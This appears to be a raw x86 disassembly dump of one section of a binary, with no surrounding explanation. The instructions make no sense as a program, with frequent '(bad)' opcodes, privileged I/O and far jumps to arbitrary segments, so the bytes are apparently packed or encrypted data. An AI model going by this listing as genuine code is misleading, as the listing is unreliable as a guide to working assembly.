  4050bc:	aas    
  4050bd:	push   ebp
  4050be:	mov    ds:0x7eddb77,eax
  4050c3:	mov    eax,0x3948ff7a
  4050c8:	int3   
  4050c9:	sub    bh,BYTE PTR [esi+0x3f]
  4050cc:	xor    eax,0x2ebaf6de
  4050d1:	fisub  WORD PTR ds:0xde7fb261
  4050d7:	dec    ebp
  4050d8:	pop    esi
  4050d9:	daa    
  4050da:	shl    edx,0xb9
  4050dd:	iret   
  4050de:	push   ebx
  4050df:	jmp    0x2f89:0x6c134230
  4050e6:	das    
  4050e7:	add    eax,0x8798a4ba
  4050ec:	jns    0x4050da
  4050ee:	xchg   ecx,eax
  4050ef:	daa    
  4050f0:	popf   
  4050f1:	jo     0x405137
  4050f3:	(bad)  
  4050f4:	les    ebp,FWORD PTR ds:0xfdfce223
  4050fa:	std    
  4050fb:	lahf   
  4050fc:	ins    BYTE PTR es:[edi],dx
  4050fd:	lock jmp 0x92fd:0x72fe4c7a
  405105:	fwait
  405106:	dec    esp
  405107:	hlt    
  405108:	mov    eax,0x90c15383
  40510d:	pop    ebp
  40510e:	mov    bl,0x20
  405110:	and    bl,BYTE PTR [edi-0x38c09b3a]
  405116:	xlat   BYTE PTR ds:[ebx]
  405117:	ds sbb esi,edi
  40511a:	test   DWORD PTR [ebx],ebx
  40511c:	adc    eax,0x507ec0c6
  405121:	jnp    0x4050da
  405123:	dec    ebp
  405124:	sub    eax,0xcb4d87e7
  405129:	fistp  QWORD PTR [edi+0x6eeaf54c]
  40512f:	push   ebx
  405130:	fnstcw WORD PTR [edx-0x5f04d7b4]
  405136:	sahf   
  405137:	cmp    eax,DWORD PTR [edx]
  405139:	popa   
  40513a:	int3   
  40513b:	xor    eax,0x5cfa348b
  405140:	mov    bh,0xed
  405142:	sahf   
  405143:	fcom   QWORD PTR [edx]
  405145:	popf   
  405146:	rol    dl,1
  405148:	arpl   di,sp
  40514a:	(bad)  
  40514b:	aaa    
  40514c:	inc    edx
  40514d:	inc    eax
  40514e:	jmp    0xb5ab08a5
  405153:	pushf  
  405154:	mov    ebp,0xce0df454
  405159:	mov    edi,ecx
  40515b:	int    0x7d
  40515d:	sbb    dl,BYTE PTR [edx]
  40515f:	shr    DWORD PTR [edx+0x39],1
  405162:	imul   edi,DWORD PTR [esi-0x2f72d982],0x65008df4
  40516c:	xor    DWORD PTR [eax-0x7d],ebx
  40516f:	mov    ch,0xf4
  405171:	add    al,BYTE PTR [ecx-0x41]
  405174:	arpl   WORD PTR [eax],bx
  405176:	jle    0x4050fa
  405178:	in     eax,0xdb
  40517a:	adc    edi,ebp
  40517c:	mov    ds:0xebc955ae,eax
  405181:	sbb    DWORD PTR [esi+ebp*1],0x77
  405185:	add    dl,BYTE PTR [eax+0xb643037]
  40518b:	xor    eax,0xb7776de5
  405190:	mov    al,ds:0x48e76dec
  405195:	aam    0x88
  405197:	fwait
  405198:	imul   edi,DWORD PTR [edx-0x4a8392ed],0xfffffff9
  40519f:	fwait
  4051a0:	sub    cl,al
  4051a2:	dec    edi
  4051a3:	add    esp,DWORD PTR [esp+ecx*4-0x35c9ff3e]
  4051aa:	xor    BYTE PTR [ecx+0x68324e6f],ch
  4051b0:	cmp    eax,0xf5c52716
  4051b5:	leave  
  4051b6:	cli    
  4051b7:	adc    eax,0x4cb3a10b
  4051bc:	std    
  4051bd:	inc    edx
  4051be:	iret   
  4051bf:	push   edi
  4051c0:	jl     0x4051a6
  4051c2:	cmp    ch,bl
  4051c4:	push   ds
  4051c5:	ins    BYTE PTR es:[edi],dx
  4051c6:	stos   DWORD PTR es:[di],eax
  4051c8:	fs jb  0x4051b9
  4051cb:	(bad)  
  4051cd:	sti    
  4051ce:	add    al,0x22
  4051d0:	cmc    
  4051d1:	test   DWORD PTR [ebp+0x6a465838],eax
  4051d7:	in     al,dx
  4051d8:	push   ebp
  4051d9:	imul   edi,ebx,0xffffff9f
  4051dc:	pusha  
  4051dd:	mov    cl,0x90
  4051df:	add    al,0x44
  4051e1:	fs lahf 
  4051e3:	jbe    0x405165
  4051e5:	adc    ebx,DWORD PTR [edx+0x57952452]
  4051eb:	cmp    esi,edi
  4051ed:	pop    ss
  4051ee:	addr16 pushf 
  4051f0:	cmp    ebx,DWORD PTR [esi+0x611ca49f]
  4051f6:	retf   
  4051f7:	mov    cl,0x63
  4051f9:	jg     0x405268
  4051fb:	jmp    0x405229
  4051fd:	sub    al,0xbc
  4051ff:	pop    esp
  405200:	xchg   esp,eax
  405201:	loope  0x405224
  405203:	retf   
  405204:	call   0x24fbb943
  405209:	adc    ah,BYTE PTR [edx]
  40520b:	outs   dx,BYTE PTR ds:[esi]
  40520c:	sbb    bl,ah
  40520e:	sbb    al,0x2
  405210:	xchg   ebx,eax
  405211:	clc    
  405212:	push   es
  405213:	mov    cl,0x79
  405215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405216:	and    al,0x40
  405218:	cmp    ebx,DWORD PTR [eax+0x32]
  40521b:	sbb    BYTE PTR [esi-0x485de149],cl
  405221:	pop    ds
  405222:	outs   dx,DWORD PTR es:[esi]
  405224:	outs   dx,DWORD PTR ds:[esi]
  405225:	das    
  405226:	ja     0x405261
  405228:	cmp    BYTE PTR [ebp-0x4a],bl
  40522b:	in     al,0x78
  40522d:	paddsb mm5,QWORD PTR [ecx-0x1e]
  405231:	adc    dl,BYTE PTR [esi+ecx*8-0x25fe0132]
  405238:	or     eax,esp
  40523a:	adc    DWORD PTR [ecx+0x6],ecx
  40523d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40523e:	fbstp  TBYTE PTR [ebx]
  405240:	jb     0x40524a
  405242:	test   ch,dl
  405244:	ins    BYTE PTR es:[edi],dx
  405245:	push   ebp
  405246:	inc    eax
  405247:	loope  0x405258
  405249:	xchg   edi,eax
  40524a:	stos   DWORD PTR es:[edi],eax
  40524b:	mov    eax,ds:0xe51576bc
  405250:	into   
  405251:	mov    edx,0xe194d834
  405256:	mov    bh,0x90
  405258:	lods   al,BYTE PTR ds:[esi]
  405259:	ins    BYTE PTR es:[edi],dx
  40525a:	shl    BYTE PTR [esi-0x72e4a2d0],cl
  405260:	adc    dh,BYTE PTR [edx]
  405262:	fmul   DWORD PTR [esi+0x13c39d42]
  405268:	pop    esi
  405269:	mov    BYTE PTR [esi-0x58],al
  40526c:	stos   BYTE PTR es:[edi],al
  40526d:	retf   0x7603
  405270:	push   esi
  405271:	push   eax
  405272:	call   0xa80:0xbc4f074e
  405279:	add    edx,DWORD PTR [eax]
  40527b:	out    dx,eax
  40527c:	xlat   BYTE PTR ds:[ebx]
  40527d:	fidivr DWORD PTR [edx]
  40527f:	pop    ds
  405280:	dec    ecx
  405281:	xchg   edx,eax
  405282:	xlat   BYTE PTR ds:[ebx]
  405283:	fs xchg esp,eax
  405285:	jo     0x40521e
  405287:	fnstsw WORD PTR [ebx-0x63bab7f6]
  40528d:	or     ch,BYTE PTR [eax+0x7]
  405290:	je     0x405254
  405292:	call   0x2c15:0xaabba93c
  405299:	cdq    
  40529a:	retf   0x92e3
  40529d:	ror    DWORD PTR [edi],0x5d
  4052a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052a1:	pop    eax
  4052a2:	loopne 0x405265
  4052a4:	scas   eax,DWORD PTR es:[edi]
  4052a5:	adc    eax,0xb2b77097
  4052aa:	mov    ch,0xf
  4052ac:	pop    esi
  4052ad:	pop    esp
  4052ae:	repnz add ch,BYTE PTR [eax+0x7b]
  4052b2:	mov    al,ds:0x6efac9c0
  4052b7:	push   ebp
  4052b8:	mov    eax,ds:0x3676cdd7
  4052bd:	pop    ss
  4052be:	jae    0x405248
  4052c0:	test   DWORD PTR [ebx-0x4e],esp
  4052c3:	jb     0x40525a
  4052c5:	in     ax,dx
  4052c7:	xlat   BYTE PTR ds:[ebx]
  4052c8:	leave  
  4052c9:	mov    ds:0x3a359c7a,al
  4052ce:	xor    DWORD PTR [ebp-0x57991514],0x59aca8ba
  4052d8:	fsubr  QWORD PTR [ebx-0x12f77780]
  4052de:	push   eax
  4052df:	(bad)  
  4052e0:	outs   dx,DWORD PTR ds:[esi]
  4052e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052e2:	xor    al,0x32
  4052e4:	nop
  4052e5:	call   0xd6319d25
  4052ea:	jmp    0x405315
  4052ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052ed:	imul   eax,esi,0xe02fbb6a
  4052f3:	es mov edx,0xea42c23d
  4052f9:	or     DWORD PTR [esi+0x35],ecx
  4052fc:	jb     0x4052bc
  4052fe:	test   eax,0xd30e0525
  405303:	jmp    0x3cf4:0xf999b32
  40530a:	pushf  
  40530b:	fmulp  st(6),st
  40530d:	into   
  40530e:	jnp    0x405355
  405310:	in     eax,dx
  405311:	xor    BYTE PTR [edi+edi*8],bl
  405314:	inc    edx
  405315:	shl    ah,cl
  405317:	adc    dl,BYTE PTR [ecx-0x7f]
  40531a:	clc    
  40531b:	sbb    dl,ch
  40531d:	fnsave [esi-0x63897b47]
  405323:	stos   DWORD PTR es:[edi],eax
  405324:	and    esp,DWORD PTR [ecx-0x545c0620]
  40532a:	push   edi
  40532b:	stc    
  40532c:	lahf   
  40532d:	in     al,0x99
  40532f:	adc    BYTE PTR ds:0x2f21f9f9,bl
  405335:	adc    al,0x7b
  405337:	pop    ecx
  405338:	mov    ch,0xa5
  40533a:	call   0x9a0f:0x4935d052
  405341:	inc    ebx
  405342:	mov    BYTE PTR ds:0x3f57367d,0x3d
  405349:	cwde   
  40534a:	dec    ecx
  40534b:	rol    DWORD PTR [eax-0x45],cl
  40534e:	shr    BYTE PTR [esi-0x4d54d162],1
  405354:	jae    0x40532c
  405356:	ret    0xf7de
  405359:	xlat   BYTE PTR ds:[ebx]
  40535a:	mov    edi,0x2352fc05
  40535f:	jp     0x40530f
  405361:	push   0xf086eec3
  405366:	add    cl,cl
  405368:	pop    eax
  405369:	nop
  40536a:	pop    esi
  40536b:	repnz sbb eax,0xa798229f
  405371:	test   BYTE PTR [ebx],cl
  405373:	mov    ds:0xa3d6a262,eax
  405378:	dec    esp
  405379:	cmp    BYTE PTR [ecx],0x14
  40537c:	push   ecx
  40537d:	imul   edi,DWORD PTR [ebx-0x573e484f],0xffffffa7
  405384:	lahf   
  405385:	test   DWORD PTR [ebx],0x27e1d599
  40538b:	and    DWORD PTR [esi],ebp
  40538d:	ins    DWORD PTR es:[edi],dx
  40538e:	jmp    0x80f9:0xe569a2a7
  405395:	addr16 inc ecx
  405397:	sbb    DWORD PTR [ecx-0x7715c135],esi
  40539d:	push   eax
  40539e:	mov    BYTE PTR ds:0x8a334bfb,al
  4053a4:	mov    ch,0xdc
  4053a6:	jp     0x4053a5
  4053a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053a9:	jge    0x4053a5
  4053ab:	ss push ecx
  4053ad:	pop    ds
  4053ae:	push   0x69
  4053b0:	int    0x51
  4053b2:	ret    0x7223
  4053b5:	inc    esp
  4053b6:	pop    ss
  4053b7:	dec    ecx
  4053b8:	mov    ah,0xe9
  4053ba:	sub    DWORD PTR [eax-0x76],edi
  4053bd:	mov    eax,ds:0x619f3ecb
  4053c2:	and    dh,BYTE PTR [ebp-0xb]
  4053c5:	jp     0x40543e
  4053c7:	sar    BYTE PTR [esi-0x2b],cl
  4053ca:	into   
  4053cb:	xchg   ecx,eax
  4053cc:	imul   BYTE PTR [eax+ecx*1]
  4053cf:	fsubr  QWORD PTR [esi]
  4053d1:	pop    ss
  4053d2:	sub    DWORD PTR [edi+0x75],0x7
  4053d6:	jnp    0x4053c7
  4053d8:	mov    ecx,0x1c6699b9
  4053dd:	sbb    al,0x83
  4053df:	les    esp,FWORD PTR [ebp-0x2f64fa5c]
  4053e5:	push   esp
  4053e6:	dec    edx
  4053e7:	(bad)  
  4053e9:	jmp    0xdd8f:0xef8ae26c
  4053f0:	imul   ebp,DWORD PTR [edi+0x5a244711],0x3dd8e03f
  4053fa:	bound  edi,QWORD PTR cs:[ebx-0x242f479e]
  405401:	sub    BYTE PTR [esi],0x9c
  405404:	neg    DWORD PTR [esi]
  405406:	std    
  405407:	inc    eax
  405408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405409:	fmul   QWORD PTR [edi+0x7]
  40540c:	cld    
  40540d:	mov    eax,edi
  40540f:	je     0x4053da
  405411:	or     eax,0x8e6f0827
  405416:	lods   eax,DWORD PTR ds:[esi]
  405417:	test   eax,0x993b8e65
  40541c:	inc    esi
  40541d:	dec    edx
  40541e:	xchg   edx,eax
  40541f:	sbb    ecx,ebp
  405421:	fdivp  st(1),st
  405423:	iret   
  405424:	mov    al,0x90
  405426:	mov    dh,0x43
  405428:	lea    edx,[ebx]
  40542a:	jmp    0x40545a
  40542c:	sbb    al,0x9b
  40542e:	leave  
  40542f:	sbb    eax,0x1d0165ce
  405434:	es or  ch,dl
  405437:	das    
  405438:	and    bl,BYTE PTR [esi-0x17]
  40543b:	fs loopne 0x4053f2
  40543e:	cmp    dh,BYTE PTR ds:[ecx+ebx*1-0x5a]
  405443:	pop    edx
  405444:	cmp    al,0xed
  405446:	test   al,0x6b
  405448:	dec    edi
  405449:	cwde   
  40544a:	rol    ch,1
  40544c:	and    cl,BYTE PTR ds:0x6dbd2c27
  405452:	data16 aas 
  405454:	div    bh
  405456:	lds    esp,FWORD PTR [edi-0x4e]
  405459:	pop    es
  40545a:	repz xor ah,BYTE PTR [esp+edx*8]
  40545e:	xchg   ebp,eax
  40545f:	inc    eax
  405460:	mov    ah,0x5b
  405462:	adc    ebp,edi
  405464:	sub    ch,BYTE PTR [esp+eax*8-0x21]
  405468:	lahf   
  405469:	inc    esp
  40546a:	scas   eax,DWORD PTR es:[edi]
  40546b:	adc    al,0x19
  40546d:	pop    edi
  40546e:	neg    esp
  405470:	inc    esi
  405471:	xchg   ecx,eax
  405472:	ins    BYTE PTR es:[edi],dx
  405473:	cmp    eax,0x4be45c3e
  405478:	stos   BYTE PTR es:[edi],al
  405479:	icebp  
  40547a:	ja     0x40547d
  40547c:	ds mov esp,ebp
  40547f:	test   al,0x85
  405481:	pop    ds
  405482:	mov    al,ds:0x5b29d35
  405487:	and    dl,BYTE PTR [ecx-0x6f]
  40548a:	rcr    ebp,0x7b
  40548d:	xor    al,0x6a
  40548f:	out    0x16,al
  405491:	(bad)  [eax+0x4e8a2c73]
  405497:	sbb    BYTE PTR [ebx+0x6b],ch
  40549a:	jl     0x405495
  40549c:	and    al,0xbb
  40549e:	push   ecx
  40549f:	je     0x405437
  4054a1:	mov    ebp,0x4918d6c7
  4054a6:	or     DWORD PTR [esi-0x247a4be2],edx
  4054ac:	xchg   ebx,eax
  4054ad:	mov    esp,0x6fd1e174
  4054b2:	test   al,0x7a
  4054b4:	xor    al,0xd4
  4054b6:	daa    
  4054b7:	fimul  DWORD PTR [ebx+ecx*8-0x275bd611]
  4054be:	addr16 pop ss
  4054c0:	xchg   edx,eax
  4054c1:	pop    ebx
  4054c2:	add    DWORD PTR [edi+0x1f8f8947],ebx
  4054c8:	fpatan 
  4054ca:	mov    eax,0x1bbee206
  4054cf:	fwait
  4054d0:	jae    0x4054ec
  4054d2:	pusha  
  4054d3:	sub    DWORD PTR [ecx-0x3e],0x68
  4054d7:	or     DWORD PTR [edi+0x51],esi
  4054da:	and    eax,0x689ec83e
  4054df:	xchg   edx,eax
  4054e0:	repnz ficomp DWORD PTR [esi+0x51f2dd45]
  4054e7:	clc    
  4054e8:	mov    ecx,0xf62ac68a
  4054ed:	lahf   
  4054ee:	aas    
  4054ef:	mov    edx,0xb08eea96
  4054f4:	adc    al,0x71
  4054f6:	mov    al,0x5
  4054f8:	test   BYTE PTR [edx+0x45299b3],ah
  4054fe:	jnp    0x40550f
  405500:	mov    ds:0x40d87961,eax
  405505:	jmp    0xfc2a:0xd51bd00f
  40550c:	push   es
  40550d:	sbb    BYTE PTR ds:[esi],dl
  405510:	mov    cl,0x46
  405512:	dec    edi
  405513:	pop    edx
  405514:	(bad)  
  405515:	mov    edi,0x177a5c11
  40551a:	or     dh,BYTE PTR [esi]
  40551c:	idiv   BYTE PTR [eax-0x3b8c2849]
  405522:	xlat   BYTE PTR ds:[ebx]
  405523:	xchg   ebx,eax
  405524:	retf   
  405525:	or     al,0xb3
  405527:	xor    eax,0xed9fa7e8
  40552c:	ds js  0x405548
  40552f:	aad    0x7b
  405531:	or     eax,0xe3ad4535
  405536:	rcr    edx,cl
  405538:	out    0x8,eax
  40553a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40553b:	pop    ebx
  40553c:	mov    DWORD PTR [edi-0x3d55d8cf],ebx
  405542:	push   ss
  405543:	dec    ebx
  405544:	xchg   esi,eax
  405545:	xchg   esp,eax
  405546:	xor    BYTE PTR [edi],dh
  405548:	call   0x61fb:0x3ea1e78
  40554f:	mov    ah,0x32
  405551:	inc    esp
  405552:	add    DWORD PTR [esi],ebp
  405554:	call   0x4df:0xe8b0a549
  40555b:	fldcw  WORD PTR [ecx-0x5f]
  40555e:	add    esp,DWORD PTR [eax+0x26e15ba]
  405564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405565:	sbb    eax,0x8ffcef7
  40556a:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40556c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40556d:	push   0x7d
  40556f:	stc    
  405570:	xlat   BYTE PTR ss:[ebx]
  405572:	nop
  405573:	pop    ebp
  405574:	add    dl,BYTE PTR [edx-0x12470289]
  40557a:	xor    ebp,DWORD PTR [edx+0x20bc6682]
  405580:	gs pop esi
  405582:	dec    edi
  405583:	inc    edi
  405584:	sbb    esp,edx
  405586:	sbb    al,0xc
  405588:	mov    BYTE PTR [esp+esi*8],dh
  40558b:	(bad)  
  40558c:	loopne 0x405534
  40558e:	push   DWORD PTR [eax+esi*8-0x29d8269a]
  405595:	retf   0x8dc8
  405598:	mov    al,0x61
  40559a:	jae    0x4055b6
  40559c:	fmulp  st(3),st
  40559e:	jns    0x40557f
  4055a0:	mov    eax,0x479df6e3
  4055a5:	dec    ecx
  4055a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055a7:	adc    al,0x2d
  4055a9:	jnp    0x405607
  4055ab:	outs   dx,DWORD PTR ds:[esi]
  4055ac:	push   esp
  4055ad:	ret    
  4055ae:	pop    ds
  4055af:	je     0x4055d1
  4055b1:	jmp    0xd5d4:0x2d61df85
  4055b8:	(bad)  
  4055b9:	xor    BYTE PTR [ebp+0x6d],ch
  4055bc:	clc    
  4055bd:	mov    al,0x47
  4055bf:	outs   dx,DWORD PTR ss:[esi]
  4055c1:	cmp    eax,0x351da587
  4055c6:	xchg   esp,eax
  4055c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055c8:	call   0xba82:0x8f127f0e
  4055cf:	inc    ebx
  4055d0:	mov    WORD PTR [ecx+ebp*2-0x5b85274a],es
  4055d7:	rcl    DWORD PTR [esi-0x12f11c2c],0xb2
  4055de:	xor    DWORD PTR [ebx+0x6c],0x27850281
  4055e5:	in     eax,dx
  4055e6:	ins    BYTE PTR es:[edi],dx
  4055e7:	loope  0x40559e
  4055e9:	out    dx,eax
  4055ea:	adc    al,0x61
  4055ec:	mov    WORD PTR [edx],?
  4055ee:	jl     0x405585
  4055f0:	jecxz  0x4055c5
  4055f2:	adc    al,0x95
  4055f4:	mov    esi,0xf2ed5044
  4055f9:	ror    edx,1
  4055fb:	loopne 0x40566d
  4055fd:	pop    ecx
  4055fe:	dec    ebx
  4055ff:	in     eax,0xc
  405601:	jno    0x405631
  405603:	sbb    BYTE PTR [edx+0x48927094],bl
  405609:	test   al,0xc6
  40560b:	inc    ebx
  40560c:	and    al,0x6a
  40560e:	lea    ecx,[edi+0x1a]
  405611:	xchg   esi,eax
  405612:	dec    esi
  405613:	and    DWORD PTR [edx],0xe1879eb8
  405619:	outs   dx,DWORD PTR ds:[esi]
  40561a:	sbb    ecx,esp
  40561c:	add    esi,esp
  40561e:	add    eax,DWORD PTR [ebp+0x51]
  405621:	or     DWORD PTR [esi+0x21],ebp
  405624:	js     0x40562d
  405626:	and    esp,DWORD PTR [eax+0x147aa584]
  40562c:	or     dh,ah
  40562e:	pop    eax
  40562f:	dec    ebp
  405630:	shl    DWORD PTR [edx-0x9],0x4a
  405634:	test   BYTE PTR [ebx+0x61],ah
  405637:	push   ebx
  405638:	pop    edx
  405639:	cwde   
  40563a:	outs   dx,DWORD PTR ds:[esi]
  40563b:	mov    esi,0xe478cf9
  405640:	stos   BYTE PTR es:[edi],al
  405641:	pushw  ds
  405643:	inc    esp
  405644:	jle    0x405634
  405646:	add    dl,BYTE PTR [ebp+0x0]
  405649:	(bad)  
  40564a:	call   0xd473:0x5ac3
  405650:	pop    ecx
  405651:	mov    esi,0x1ef2398f
  405656:	sub    al,0x28
  405658:	gs pop ebp
  40565a:	stos   DWORD PTR es:[edi],eax
  40565b:	sbb    DWORD PTR [esi-0x57],esi
  40565e:	test   bl,ch
  405660:	dec    esi
  405661:	push   ss
  405662:	xor    bh,ah
  405664:	inc    edx
  405665:	adc    BYTE PTR [ebp+0x11025e07],0xb6
  40566c:	push   0x42
  40566e:	stc    
  40566f:	cmp    cl,ch
  405671:	rcl    BYTE PTR [esi],0x64
  405674:	cmp    al,0x49
  405676:	(bad)  
  405677:	in     eax,0x27
  405679:	jmp    0x81c8:0x2ffdc849
  405680:	stos   DWORD PTR es:[edi],eax
  405681:	clc    
  405682:	xor    ah,cl
  405684:	inc    ebx
  405685:	jg     0x405636
  405687:	jmp    0x268ca0ff
  40568c:	shl    DWORD PTR [esi-0xf759aa5],cl
  405692:	(bad)  
  405693:	in     al,dx
  405694:	jbe    0x40561f
  405696:	xchg   esi,eax
  405697:	inc    edi
  405698:	rcr    ebp,0xc0
  40569b:	jae    0x4056df
  40569d:	xlat   BYTE PTR ds:[ebx]
  40569e:	add    BYTE PTR [esi+0x27],bh
  4056a1:	pop    ds
  4056a2:	aaa    
  4056a3:	push   ebp
  4056a4:	jno    0x40567a
  4056a6:	mov    ah,0x35
  4056a8:	test   cl,dh
  4056aa:	xchg   edx,eax
  4056ab:	fnstsw ax
  4056ad:	dec    esi
  4056ae:	sub    eax,eax
  4056b0:	or     ebp,DWORD PTR [ebx]
  4056b2:	xchg   ecx,eax
  4056b3:	fld    DWORD PTR [esi+0x6a]
  4056b6:	sub    edi,edi
  4056b8:	jnp    0x405696
  4056ba:	push   ebp
  4056bb:	xor    ecx,DWORD PTR [ebx-0x5a883d5c]
  4056c1:	out    0xd9,al
  4056c3:	rcl    ebx,0x7d
  4056c6:	pop    esi
  4056c7:	and    eax,0x5cca108f
  4056cc:	xchg   edx,eax
  4056cd:	imul   DWORD PTR [eax]
  4056cf:	scas   eax,DWORD PTR es:[edi]
  4056d0:	ds push ebp
  4056d2:	test   al,0xbe
  4056d4:	cmp    eax,esi
  4056d6:	jge    0x40567d
  4056d8:	adc    eax,0xc61f0808
  4056dd:	call   0x1689cb50
  4056e2:	mov    ds:0x2b688dcb,al
  4056e7:	mov    ds:0x5e8ed6df,al
  4056ec:	mov    ah,0xc1
  4056ee:	cli    
  4056ef:	test   al,0x73
  4056f1:	loopne 0x40567a
  4056f3:	and    ecx,DWORD PTR [ebx+0x28]
  4056f6:	and    al,0xd5
  4056f8:	shl    DWORD PTR [eax-0x60],cl
  4056fb:	fmul   st,st(4)
  4056fd:	cmc    
  4056fe:	adc    cl,BYTE PTR [eiz*8+0x44f9f502]
  405705:	jns    0x4056ef
  405707:	jo     0x405754
  405709:	sahf   
  40570a:	lods   eax,DWORD PTR ds:[esi]
  40570b:	or     ah,BYTE PTR [ebp-0x61]
  40570e:	push   ss
  40570f:	test   ch,al
  405711:	mov    esi,0x3b28a4b5
  405716:	rcl    DWORD PTR [esi+0x6a],cl
  405719:	push   0xc435c990
  40571e:	pop    ecx
  40571f:	pusha  
  405720:	inc    ecx
  405721:	retf   0xe9e1
  405724:	mov    cs,WORD PTR [eax-0x184aa06b]
  40572a:	js     0x4056d7
  40572c:	call   0x8219bbef
  405731:	jmp    0x769b20f7
  405736:	retf   0xfc45
  405739:	mov    dh,0x43
  40573b:	jle    0x40579a
  40573d:	dec    ecx
  40573e:	mov    WORD PTR [edi-0x50b91e88],?
  405744:	pusha  
  405745:	or     bl,BYTE PTR [edi+0xb]
  405748:	xor    WORD PTR [esi],0xffaf
  40574c:	pusha  
  40574d:	sub    eax,0xfdc5c099
  405752:	push   0x3f
  405754:	das    
  405755:	xor    cl,ah
  405757:	hlt    
  405758:	adc    eax,0x1e2924c1
  40575d:	popa   
  40575e:	cmp    esp,DWORD PTR [ebp-0x4d1962ea]
  405764:	inc    ebx
  405765:	sub    eax,0xfec5af66
  40576a:	or     al,0xa0
  40576c:	sti    
  40576d:	test   DWORD PTR [ecx+0x2a77016c],edx
  405773:	in     al,0xeb
  405775:	cs push cs
  405777:	dec    esi
  405778:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405779:	dec    eax
  40577a:	mov    bh,0x26
  40577c:	lock loop 0x4057c9
  40577f:	repz cmp ch,bh
  405782:	ret    0x55c1
  405785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405786:	lds    esp,FWORD PTR [ecx+0x1a9f1d10]
  40578c:	in     al,dx
  40578d:	push   cs
  40578e:	icebp  
  40578f:	jp     0x405759
  405791:	jnp    0x405714
  405793:	dec    edx
  405794:	in     al,dx
  405795:	push   ds
  405796:	int3   
  405797:	shl    DWORD PTR [ebx],cl
  405799:	cmp    eax,DWORD PTR [edx+0x7a]
  40579c:	ss jg  0x4057ef
  40579f:	sahf   
  4057a0:	cmp    ebx,0xffffffd1
  4057a3:	pop    esi
  4057a4:	or     bl,BYTE PTR [edi+0x73c47f79]
  4057aa:	push   ds
  4057ab:	cwde   
  4057ac:	add    DWORD PTR cs:[ecx+0x1f],ebx
  4057b0:	jge    0x4057bc
  4057b2:	mov    eax,0x3244d8e7
  4057b7:	xchg   BYTE PTR [ebx],cl
  4057b9:	xlat   BYTE PTR ds:[ebx]
  4057ba:	daa    
  4057bb:	in     al,dx
  4057bc:	add    al,0x31
  4057be:	mov    ebx,0x7ae165d1
  4057c3:	loope  0x405793
  4057c5:	mov    esi,0xe9067554
  4057ca:	jmp    0xc96d:0xf2d4710a
  4057d1:	xor    al,0x9d
  4057d3:	inc    esp
  4057d4:	pop    edi
  4057d5:	inc    edi
  4057d6:	xchg   cl,dl
  4057d8:	mov    ebp,0x4d0fdf72
  4057dd:	xchg   esi,eax
  4057de:	stc    
  4057df:	xchg   esp,eax
  4057e0:	jbe    0x4057fe
  4057e2:	sub    edi,ebx
  4057e4:	leave  
  4057e5:	cs ins DWORD PTR es:[edi],dx
  4057e7:	sahf   
  4057e8:	cmp    al,BYTE PTR [ebp-0x53]
  4057eb:	sbb    ecx,DWORD PTR [eax+ebp*1-0x2c]
  4057ef:	(bad)  
  4057f0:	and    dl,dl
  4057f2:	cmp    edi,DWORD PTR [esi]
  4057f4:	xor    BYTE PTR [ecx+esi*1+0x20f54dfd],bh
  4057fb:	jmp    0x4660b981
  405800:	pop    edx
  405801:	xchg   ebp,ebx
  405803:	mov    WORD PTR [esi],cs
  405805:	test   DWORD PTR [ecx-0x4b377c79],edx
  40580b:	xor    DWORD PTR [ecx+0x3c],eax
  40580e:	ja     0x405813
  405810:	jb     0x405805
  405812:	xchg   ecx,eax
  405813:	sub    ecx,ebx
  405815:	cmp    BYTE PTR [eax-0x73],dh
  405818:	pop    edx
  405819:	adc    ebp,0x176158a0
  40581f:	cwde   
  405820:	add    al,0xf
  405822:	mov    edi,0xaca8bf2d
  405827:	in     al,dx
  405828:	mov    ds:0x709064e1,al
  40582d:	sub    BYTE PTR [esp+eax*1+0x519039cc],ah
  405834:	jl     0x405860
  405836:	cmp    dl,cl
  405838:	jmp    0x3b0f:0xc2c454a
  40583f:	loope  0x4057f1
  405841:	leave  
  405842:	sbb    edi,esp
  405844:	push   esi
  405845:	in     eax,0x2a
  405847:	(bad)  
  405848:	jmp    0xdb1587bd
  40584d:	pushf  
  40584e:	sbb    ah,BYTE PTR [esi-0x66]
  405851:	cmp    al,0x3b
  405853:	jb     0x405855
  405855:	pop    ebp
  405856:	mov    WORD PTR [esi+0x417fbde9],ds
  40585c:	popf   
  40585d:	out    dx,al
  40585e:	sbb    BYTE PTR [esi+0x73],0xa6
  405862:	jb     0x405808
  405864:	cs jb  0x40586a
  405867:	mov    BYTE PTR [esi+0x4d],dl
  40586a:	mov    al,ds:0x9c562915
  40586f:	test   BYTE PTR [ebp-0x56],ah
  405872:	retf   
  405873:	sub    DWORD PTR [edx-0x437cc31d],esi
  405879:	mov    ah,0x87
  40587b:	es xor eax,0x99332e16
  405881:	mov    ?,WORD PTR [eax-0xd]
  405884:	mov    eax,0x15a5e1da
  405889:	daa    
  40588a:	mov    bh,0xa1
  40588c:	ret    0xeb97
  40588f:	push   esi
  405890:	mov    cl,bl
  405892:	sbb    edx,DWORD PTR [ecx+0x4e]
  405895:	cmp    DWORD PTR [edx-0x7f96610b],edx
  40589b:	das    
  40589c:	repnz and dh,BYTE PTR [edi]
  40589f:	lea    edx,[ebx+0x6a]
  4058a2:	je     0x4058f1
  4058a4:	pop    ss
  4058a5:	les    edi,FWORD PTR [eax+0x192ed15c]
  4058ab:	jns    0x40582d
  4058ad:	aad    0xef
  4058af:	xor    eax,0x942ccb97
  4058b4:	cli    
  4058b5:	inc    ecx
  4058b6:	add    DWORD PTR [eax-0x3f],ebx
  4058b9:	pop    ebx
  4058ba:	push   ebp
